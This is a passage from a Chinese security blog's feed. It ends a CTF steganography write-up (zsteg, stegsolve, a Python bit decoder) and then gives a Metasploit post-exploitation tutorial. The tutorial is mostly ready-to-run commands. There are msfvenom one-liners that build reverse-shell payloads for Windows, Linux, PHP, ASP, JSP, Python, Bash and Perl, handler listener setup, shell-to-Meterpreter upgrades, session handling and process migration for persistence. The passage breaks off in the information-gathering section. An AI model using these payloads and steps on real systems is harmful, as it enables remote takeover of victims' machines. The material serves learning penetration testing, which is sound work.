class="number">06</span>b66ba.jpg<span class="string">&#x27; @ error/jpeg.c/JPEGErrorHandler/342.</span></span><br><span class="line"><span class="string">montage: delegate library support not built-in &#x27;</span>/usr/share/fonts/type1/gsfonts/n019003l.pf<span class="string">b&#x27; (Freetype) @ warning/annotate.c/RenderFreetype/1836.</span></span><br><span class="line"><span class="string">montage: geometry does not contain image `/tmp/magick-JJP2g7mFGSZHQRZrEpMpVSqzm9hZg4A1&#x27;</span> @ warning/attribute.c/GetImageBoundingBox/<span class="number">510.</span></span><br><span class="line">montage: geometry does <span class="keyword">not</span> contain image `/tmp/magick-JJP2g7mFGSZHQRZrEpMpVSqzm9hZg4A1<span class="string">&#x27; @ warning/transform.c/CropImage/645.</span></span><br></pre></td></tr></table></figure><p>整合图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@root:~/桌面/不眠夜之WA<span class="comment"># gaps --image=out.jpg --generations=50 --population=120 --size=100</span></span><br><span class="line"></span><br><span class="line">=== Population:  <span class="number">120</span></span><br><span class="line">=== Generations: <span class="number">50</span></span><br><span class="line">=== Piece size:  <span class="number">100</span> px</span><br><span class="line">=== Pieces:      <span class="number">240</span></span><br><span class="line"></span><br><span class="line">=== Analyzing image: ██████████████████████████████████████████████████ <span class="number">100.0</span>% </span><br><span class="line">=== Solving puzzle:  █████████████------------------------------------- <span class="number">26.5</span>% </span><br><span class="line"></span><br><span class="line">=== GA terminated</span><br><span class="line">=== There was no improvement <span class="keyword">for</span> <span class="number">10</span> generations</span><br><span class="line"></span><br><span class="line">=== Done <span class="keyword">in</span> <span class="number">11.960</span> s</span><br><span class="line">=== Close figure to exit</span><br></pre></td></tr></table></figure><h4 id="Hello-Misc"><a href="#Hello-Misc" class="headerlink" title="Hello_Misc"></a>Hello_Misc</h4><p>一张图片、一个压缩包，图片有点像stegsolve处理过的，放入stegsolve查看。一开始想到的是Data Extract数据提取，索性直接使用<code>zsteg</code>，查看到隐藏了一个压缩包。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@root:~/桌面/flag<span class="comment"># zsteg &#x27;/root/桌面/flag/try to restore it.png&#x27; </span></span><br><span class="line">[?] 294 bytes of extra data after image end (IEND), offset = 0x578d</span><br><span class="line">extradata:<span class="number">0</span>         .. file: Zip archive data, at least v2<span class="number">.0</span> to extract</span><br><span class="line">    <span class="number">00000000</span>: <span class="number">50</span> <span class="number">4</span>b <span class="number">03</span> <span class="number">04</span> <span class="number">14</span> <span class="number">00</span> <span class="number">09</span> <span class="number">00</span>  <span class="number">63</span> <span class="number">00</span> <span class="number">7</span>b <span class="number">9</span>e <span class="number">78</span> <span class="number">50</span> <span class="number">3</span>e a0  |PK......c.&#123;.xP&gt;.|</span><br><span class="line">    <span class="number">00000010</span>: <span class="number">43</span> <span class="number">2</span>a <span class="number">6</span>c <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">96</span> <span class="number">01</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">07</span> <span class="number">00</span> <span class="number">0</span>b <span class="number">00</span> <span class="number">6</span>f <span class="number">75</span>  |C*l...........ou|</span><br><span class="line">    <span class="number">00000020</span>: <span class="number">74</span> <span class="number">2</span>e <span class="number">74</span> <span class="number">78</span> <span class="number">74</span> <span class="number">01</span> <span class="number">99</span> <span class="number">07</span>  <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">41</span> <span class="number">45</span> <span class="number">03</span> <span class="number">08</span> <span class="number">00</span>  |t.txt......AE...|</span><br><span class="line">    <span class="number">00000030</span>: <span class="number">81</span> <span class="number">1</span>e <span class="number">0</span>a f2 f2 e6 <span class="number">76</span> <span class="number">47</span>  b3 bb <span class="number">97</span> <span class="number">11</span> <span class="number">74</span> be fe <span class="number">37</span>  |......vG....t.<span class="number">.7</span>|</span><br><span class="line">    <span class="number">00000040</span>: <span class="number">72</span> <span class="number">32</span> b0 <span class="number">0</span>b <span class="number">53</span> <span class="number">66</span> c5 <span class="number">84</span>  dd <span class="number">96</span> <span class="number">83</span> fe <span class="number">64</span> b5 d5 ce  |r2..Sf......d...|</span><br><span class="line">    <span class="number">00000050</span>: <span class="number">93</span> <span class="number">34</span> <span class="number">54</span> <span class="number">63</span> d8 <span class="number">81</span> <span class="number">17</span> <span class="number">8</span>e  <span class="number">0</span>e <span class="number">09</span> fb <span class="number">7</span>f <span class="number">68</span> <span class="number">05</span> a3 <span class="number">30</span>  |<span class="number">.4</span>Tc........h.<span class="number">.0</span>|</span><br><span class="line">    <span class="number">00000060</span>: <span class="number">52</span> <span class="number">06</span> <span class="number">31</span> <span class="number">20</span> <span class="number">7</span>b <span class="number">44</span> <span class="number">74</span> <span class="number">02</span>  <span class="number">1</span>f a9 <span class="number">70</span> e4 <span class="number">00</span> <span class="number">7</span>e <span class="number">63</span> be  |R<span class="number">.1</span> &#123;Dt...p..~c.|</span><br><span class="line">    <span class="number">00000070</span>: <span class="number">60</span> ce ba <span class="number">24</span> bc a5 d6 c4  eb <span class="number">79</span> f8 <span class="number">76</span> e2 fa <span class="number">96</span> c1  |`..$.....y.v....|</span><br><span class="line">    <span class="number">00000080</span>: <span class="number">64</span> ee <span class="number">6</span>f <span class="number">3</span>e <span class="number">0</span>a fd <span class="number">9</span>e <span class="number">4</span>b  dd e1 <span class="number">23</span> bf <span class="number">72</span> c4 a4 bd  |d.o&gt;...K..<span class="comment">#.r...|</span></span><br><span class="line">    <span class="number">00000090</span>: <span class="number">9</span>e <span class="number">3</span>d <span class="number">4</span>b b1 <span class="number">60</span> <span class="number">0</span>c <span class="number">7</span>e d4  b3 <span class="number">16</span> <span class="number">62</span> c4 <span class="number">50</span> <span class="number">4</span>b <span class="number">07</span> <span class="number">08</span>  |.=K.`.~...b.PK..|</span><br><span class="line">    <span class="number">000000</span>a0: <span class="number">3</span>e a0 <span class="number">43</span> <span class="number">2</span>a <span class="number">6</span>c <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">96</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">50</span> <span class="number">4</span>b <span class="number">01</span> <span class="number">02</span>  |&gt;.C*l.......PK..|</span><br><span class="line">    <span class="number">000000</span>b0: <span class="number">1</span>f <span class="number">00</span> <span class="number">14</span> <span class="number">00</span> <span class="number">09</span> <span class="number">00</span> <span class="number">63</span> <span class="number">00</span>  <span class="number">7</span>b <span class="number">9</span>e <span class="number">78</span> <span class="number">50</span> <span class="number">3</span>e a0 <span class="number">43</span> <span class="number">2</span>a  |......c.&#123;.xP&gt;.C*|</span><br><span class="line">    <span class="number">000000</span>c0: <span class="number">6</span>c <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">96</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">07</span> <span class="number">00</span> <span class="number">2</span>f <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  |l........./.....|</span><br><span class="line">    <span class="number">000000</span>d0: <span class="number">00</span> <span class="number">00</span> <span class="number">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">6</span>f <span class="number">75</span> <span class="number">74</span> <span class="number">2</span>e <span class="number">74</span> <span class="number">78</span>  |.. .......out.tx|</span><br><span class="line">    <span class="number">000000e0</span>: <span class="number">74</span> <span class="number">0</span>a <span class="number">00</span> <span class="number">20</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">18</span> <span class="number">00</span> fb b2 <span class="number">95</span>  |t.. ............|</span><br><span class="line">    <span class="number">000000</span>f0: <span class="number">9</span>d d2 <span class="number">01</span> d6 <span class="number">01</span> fd <span class="number">99</span> a2  <span class="number">9</span>f d2 <span class="number">01</span> d6 <span class="number">01</span> fb b2 <span class="number">95</span>  |................|</span><br><span class="line">b1,r,lsb,xy         .. file: PNG image data, <span class="number">526</span> x <span class="number">298</span>, <span class="number">8</span>-bit/color RGB, non-interlaced</span><br><span class="line">b1,bgr,msb,xy       .. text: <span class="string">&quot;C2dB2IH&amp;$&quot;</span></span><br></pre></td></tr></table></figure><p>直接binwalk分离出一个压缩包，但是需要密码。接着返回到<code>stegsolve</code>，图片是红色的，直接<code>Data Extract</code>提取<code>red 0</code>通道。</p><p>拿到一张图片，然后得到压缩包密码，解压之后拿到一个txt，里面有许多数据，其中有255、127，联想到二进制。而且只有四个数字。四个数字尝试转化成二进制，最高位分别是<code>01，11，00，10</code>，后面的都一样，尝试提取前两位数，八个一组转化成ascii。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re </span><br><span class="line">fp = open(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">a = fp.readlines()</span><br><span class="line">p = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    p.append(int(i))</span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">63</span>:</span><br><span class="line">        a = <span class="string">&#x27;00&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">127</span>:</span><br><span class="line">        a = <span class="string">&#x27;01&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">191</span>:</span><br><span class="line">        a = <span class="string">&#x27;10&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">255</span>:</span><br><span class="line">        a = <span class="string">&#x27;11&#x27;</span></span><br><span class="line">    s += a</span><br><span class="line">   </span><br><span class="line">d = re.findall(<span class="string">r&#x27;.&#123;8&#125;&#x27;</span>, s)</span><br><span class="line">o = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">    o += chr(int(i, <span class="number">2</span>))</span><br><span class="line">print(o)</span><br></pre></td></tr></table></figure><p>拿到flag–<code>rar-passwd:0ac1fe6b77be5dbe</code>。</p><p>解压之后拿到一个zip，打开之后发现是一个word文档，修改为doc，空白处有字符串复制放到sublim中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAx</span><br><span class="line">MTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDEx</span><br><span class="line">MTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTEx</span><br><span class="line">MTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTEx</span><br><span class="line">MTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTEx</span><br><span class="line">MTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx</span><br></pre></td></tr></table></figure><p>尝试base64解密，拿到一串0或者1。在word中把1替换为空格，一定要替换为空格，不要替换为空。发现出现的图形不是flag。然后尝试把每一个行进行base64解码。先把word中的文字变成比较能看看到的数字。然后每一行base64解码。替换1，得到flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF-show&quot;&gt;&lt;a href=&quot;#CTF-show&quot; class=&quot;headerlink&quot; title=&quot;CTF-show&quot;&gt;&lt;/a&gt;CTF-show&lt;/h1&gt;&lt;h2 id=&quot;杂项&quot;&gt;&lt;a href=&quot;#杂项&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="CTF-杂项" scheme="http://s1eady.top/categories/CTF-%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF-杂项" scheme="http://s1eady.top/tags/CTF-%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>内网学习--Metasploit使用</title>
    <link href="http://s1eady.top/2020/08/22/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Metasploit%E4%BD%BF%E7%94%A8/"/>
    <id>http://s1eady.top/2020/08/22/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Metasploit%E4%BD%BF%E7%94%A8/</id>
    <published>2020-08-22T14:46:26.000Z</published>
    <updated>2020-10-16T11:55:42.807Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Metasploit使用"><a href="#Metasploit使用" class="headerlink" title="Metasploit使用"></a>Metasploit使用</h1><h3 id="基础常用命令"><a href="#基础常用命令" class="headerlink" title="基础常用命令"></a>基础常用命令</h3><h4 id="进入CMD-shell"><a href="#进入CMD-shell" class="headerlink" title="进入CMD-shell"></a>进入CMD-shell</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 4180 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line">Microsoft Windows</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator.WEB\Desktop&gt;</span><br></pre></td></tr></table></figure><h4 id="解决中文乱码问题"><a href="#解决中文乱码问题" class="headerlink" title="解决中文乱码问题"></a>解决中文乱码问题</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><p>或者将终端临时设置为GBK系列编码即可</p><h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><h5 id="常见shell生成"><a href="#常见shell生成" class="headerlink" title="常见shell生成"></a>常见shell生成</h5><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Linux：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line">Windows:</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">PHP:</span><br><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo <span class="string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line">ASP:</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br><span class="line"></span><br><span class="line">JSP:</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br><span class="line"></span><br><span class="line">Python:</span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">Bash:</span><br><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br><span class="line"></span><br><span class="line">Perl:</span><br><span class="line">msfvenom -p cmd/unix/reverse</span><br><span class="line">_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><h5 id="PHP-Shell"><a href="#PHP-Shell" class="headerlink" title="PHP-Shell"></a>PHP-Shell</h5><ul><li><p>生成一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击IP LPORT&#x3D;监听端口 R &gt; shell.php</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop msfvenom -p php/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.1</span><span class="number">.109</span> LPORT=<span class="number">1234</span> R &gt; shell.php</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::PHP <span class="keyword">from</span> the payload</span><br><span class="line">[-] No arch selected, selecting arch: php <span class="keyword">from</span> the payload</span><br><span class="line">No encoder <span class="keyword">or</span> badchars specified, outputting raw payload</span><br><span class="line">Payload size: <span class="number">1114</span> bytes</span><br></pre></td></tr></table></figure></li><li><p>msfconsole 监听端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 攻击IP</span><br><span class="line">lhost =&gt; 192.168.0.108</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 监听端口</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line">[-] Handler failed to bind to <span class="number">192.168</span><span class="number">.0</span><span class="number">.108</span>:<span class="number">1234</span>:-  -</span><br><span class="line">[*] Started reverse TCP handler on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1234</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="EXE-木马"><a href="#EXE-木马" class="headerlink" title="EXE-木马"></a>EXE-木马</h5><ul><li><p>生成木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=攻击IP  LPORT=监听端口 -f exe &gt; hacker.exe</span><br></pre></td></tr></table></figure></li><li><p>msfconsole监听端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 攻击IP</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LPORT 监听端口</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure></li></ul><h3 id="升级正常的Shell到Meterpreter"><a href="#升级正常的Shell到Meterpreter" class="headerlink" title="升级正常的Shell到Meterpreter"></a>升级正常的Shell到Meterpreter</h3><p>通常情况下， 当我们通过直接渗透进入系统， 并且得到了远程系统的Shell，下一步我们想要获得是Meterpreter Shell,  因为Meterpreter Shell可以向我们提供更多功能。 比如说， 提升权限， 整合到现有运行程序等等。这方面Sessions  Command 可以帮助我们实现从Shell 到Meterpreter提升。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5&gt;run post/multi/manage/shell_to_meterpreter</span><br><span class="line">msf5 post(multi/manage/shell_to_meterpreter) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/manage/shell_to_meterpreter):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection</span><br><span class="line">   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).</span><br><span class="line">   LPORT    4433             yes       Port for payload to connect to.</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line">msf5&gt;set session 2</span><br><span class="line">msf5&gt;run</span><br></pre></td></tr></table></figure><p>使用一下命名进行切换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -u sessionid</span><br></pre></td></tr></table></figure><h3 id="会话操作"><a href="#会话操作" class="headerlink" title="会话操作"></a>会话操作</h3><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sessions <span class="comment">#查看会话</span></span><br><span class="line">sessions -i &lt;ID值&gt;  <span class="comment">#进入会话</span></span><br></pre></td></tr></table></figure><h4 id="将回话保存到后台，进入会话"><a href="#将回话保存到后台，进入会话" class="headerlink" title="将回话保存到后台，进入会话"></a>将回话保存到后台，进入会话</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session <span class="number">1.</span>..</span><br><span class="line">切换到会话<span class="number">1</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions -i <span class="number">1</span></span><br><span class="line">[*] Starting interaction <span class="keyword">with</span> <span class="number">1.</span>..</span><br></pre></td></tr></table></figure><h4 id="查看会话"><a href="#查看会话" class="headerlink" title="查看会话"></a>查看会话</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                 Connection</span><br><span class="line">  --  ----  ----                     -----------                 ----------</span><br><span class="line">  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ STU1  172.20.10.3:1234 -&gt; 172.20.10.6:6990 (172.20.10.6)</span><br></pre></td></tr></table></figure><p>抓取hash密码–需要AUTHORITY\SYSTEM权限</p><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p>在刚获得的Meterpreter Shell时，该shell极其脆弱和易受攻击的，所以获得此shell的<strong>第一步就是将其迁移</strong>，把它和目标机中一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作。</p><h4 id="查看当前活跃进程"><a href="#查看当前活跃进程" class="headerlink" title="查看当前活跃进程"></a>查看当前活跃进程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name                  Arch  Session  User                          Path</span><br><span class="line"> ---   ----  ----                  ----  -------  ----                          ----</span><br><span class="line"> <span class="number">0</span>     <span class="number">0</span>     [System Process]</span><br><span class="line"> <span class="number">4</span>     <span class="number">0</span>     System                x64   <span class="number">0</span></span><br><span class="line"> <span class="number">124</span>   <span class="number">500</span>   svchost.exe           x64   <span class="number">0</span>        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe</span><br><span class="line"> <span class="number">256</span>   <span class="number">4</span>     smss.exe              x64   <span class="number">0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe</span><br><span class="line"> <span class="number">340</span>   <span class="number">332</span>   csrss.exe             x64   <span class="number">0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe</span><br><span class="line"> <span class="number">392</span>   <span class="number">332</span>   wininit.exe           x64   <span class="number">0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe</span><br><span class="line"> <span class="number">404</span>   <span class="number">384</span>   csrss.exe             x64   <span class="number">1</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe</span><br><span class="line"> <span class="number">440</span>   <span class="number">384</span>   winlogon.exe          x64   <span class="number">1</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe</span><br><span class="line"> <span class="number">500</span>   <span class="number">392</span>   services.exe          x64   <span class="number">0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe</span><br></pre></td></tr></table></figure><h4 id="获取当前进程的PID"><a href="#获取当前进程的PID" class="headerlink" title="获取当前进程的PID"></a>获取当前进程的PID</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: <span class="number">1912</span></span><br></pre></td></tr></table></figure><h4 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill &lt;pid值&gt;</span><br></pre></td></tr></table></figure><h4 id="迁移进程"><a href="#迁移进程" class="headerlink" title="迁移进程"></a>迁移进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br></pre></td></tr></table></figure><h4 id="自动迁移进程"><a href="#自动迁移进程" class="headerlink" title="自动迁移进程"></a>自动迁移进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">自动迁移进程命令：run post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br></pre></td></tr></table></figure><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h4><h5 id="查看当前用户权限"><a href="#查看当前用户权限" class="headerlink" 